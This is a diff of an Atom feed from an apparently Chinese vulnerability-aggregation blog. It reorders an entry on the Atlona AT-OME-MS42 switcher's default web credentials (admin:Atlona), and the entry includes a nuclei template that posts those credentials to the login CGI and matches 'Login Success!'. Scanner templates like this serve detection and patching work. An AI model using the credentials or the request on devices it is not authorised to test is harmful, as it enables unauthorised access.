@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-20T13:15:12.181Z</updated>
+  <updated>2025-06-20T13:45:13.252Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Atlona AT-OME-MS42 默认登录凭证漏洞</title>
+    <link href="http://example.com/2025/06/20/github_3005655972/"/>
+    <id>http://example.com/2025/06/20/github_3005655972/</id>
+    <published>2025-06-20T13:45:13.255Z</published>
+    <updated>2025-06-20T13:45:13.252Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Atlona AT-OME-MS42 默认登录凭证漏洞</p><p><strong>漏洞类型：</strong> 弱口令</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Atlona AT-OME-MS42是一款4x2矩阵切换器，支持HDMI、USB-C和DisplayPort输入。其网络接口存在默认凭证admin:Atlona，可能导致未授权访问。</p><p><strong>产品厂商：</strong> Atlona</p><p><strong>产品名称：</strong> AT-OME-MS42</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/070098dfa341efa9165d2c5ddf5e224f0cbdcd4d/http%2Fdefault-logins%2Fatlona%2FAT-OME-MS42-default-login.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/070098dfa341efa9165d2c5ddf5e224f0cbdcd4d/http%2Fdefault-logins%2Fatlona%2FAT-OME-MS42-default-login.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">AT-OME-MS42-default-login</span><br><br><span class="hljs-attribute">info</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">The Atlona AT-OME-MS42 Default Login</span><br>  <span class="hljs-attribute">author</span><span class="hljs-punctuation">:</span> <span class="hljs-string">matejsmycka</span><br>  <span class="hljs-attribute">severity</span><span class="hljs-punctuation">:</span> <span class="hljs-string">high</span><br>  <span class="hljs-attribute">description</span><span class="hljs-punctuation">:</span> <span class="hljs-string">The Atlona AT-OME-MS42 is a 4x2 matrix switcher with HDMI, USB-C, and DisplayPort inputs. It has a web interface with default credentials admin:Atlona.</span><br>  <span class="hljs-attribute">reference</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://atlona.com/pdf/manuals/AT-OME-MS42_G.pdf</span><br>  <span class="hljs-attribute">tags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">atlona, default-login</span><br><br><span class="hljs-attribute">http</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br>        POST /cgi-bin/login.cgi?ssid=&#123;&#123;base64(&#x27;admin:Atlona&#x27;)&#125;&#125; HTTP/1.1<br>        <span class="hljs-attribute">Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;Hostname&#125;&#125;</span><br>        <span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0</span><br>    <span class="hljs-attribute">matchers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: status</span><br>        <span class="hljs-attribute">status</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">200</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: word</span><br>        <span class="hljs-attribute">words</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;Login Success!&#x27;</span><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Atlona AT-OME-MS42 默认登录凭证漏洞&lt;/p&gt;
+&lt;p&gt;&lt;str</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="弱口令" scheme="http://example.com/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
+    
+  </entry>
   
   <entry>
     <title>Atlona AT-OME-MS42 默认登录漏洞</title>
@@ -94,33 +121,6 @@
     <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
     <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Atlona AT-OME-MS42 默认登录凭证漏洞</title>
-    <link href="http://example.com/2025/06/20/github_3005655972/"/>
-    <id>http://example.com/2025/06/20/github_3005655972/</id>
-    <published>2025-06-20T12:15:11.845Z</published>
-    <updated>2025-06-20T12:15:11.844Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Atlona AT-OME-MS42 默认登录凭证漏洞</p><p><strong>漏洞类型：</strong> 弱口令</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Atlona AT-OME-MS42是一款4x2矩阵切换器，支持HDMI、USB-C和DisplayPort输入。其网络接口存在默认凭证admin:Atlona，可能导致未授权访问。</p><p><strong>产品厂商：</strong> Atlona</p><p><strong>产品名称：</strong> AT-OME-MS42</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/070098dfa341efa9165d2c5ddf5e224f0cbdcd4d/http%2Fdefault-logins%2Fatlona%2FAT-OME-MS42-default-login.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/070098dfa341efa9165d2c5ddf5e224f0cbdcd4d/http%2Fdefault-logins%2Fatlona%2FAT-OME-MS42-default-login.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">AT-OME-MS42-default-login</span><br><br><span class="hljs-attribute">info</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">The Atlona AT-OME-MS42 Default Login</span><br>  <span class="hljs-attribute">author</span><span class="hljs-punctuation">:</span> <span class="hljs-string">matejsmycka</span><br>  <span class="hljs-attribute">severity</span><span class="hljs-punctuation">:</span> <span class="hljs-string">high</span><br>  <span class="hljs-attribute">description</span><span class="hljs-punctuation">:</span> <span class="hljs-string">The Atlona AT-OME-MS42 is a 4x2 matrix switcher with HDMI, USB-C, and DisplayPort inputs. It has a web interface with default credentials admin:Atlona.</span><br>  <span class="hljs-attribute">reference</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://atlona.com/pdf/manuals/AT-OME-MS42_G.pdf</span><br>  <span class="hljs-attribute">tags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">atlona, default-login</span><br><br><span class="hljs-attribute">http</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br>        POST /cgi-bin/login.cgi?ssid=&#123;&#123;base64(&#x27;admin:Atlona&#x27;)&#125;&#125; HTTP/1.1<br>        <span class="hljs-attribute">Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;Hostname&#125;&#125;</span><br>        <span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0</span><br>    <span class="hljs-attribute">matchers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: status</span><br>        <span class="hljs-attribute">status</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">200</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: word</span><br>        <span class="hljs-attribute">words</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;Login Success!&#x27;</span><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Atlona AT-OME-MS42 默认登录凭证漏洞&lt;/p&gt;
-&lt;p&gt;&lt;str</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="弱口令" scheme="http://example.com/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
     
   </entry>
   
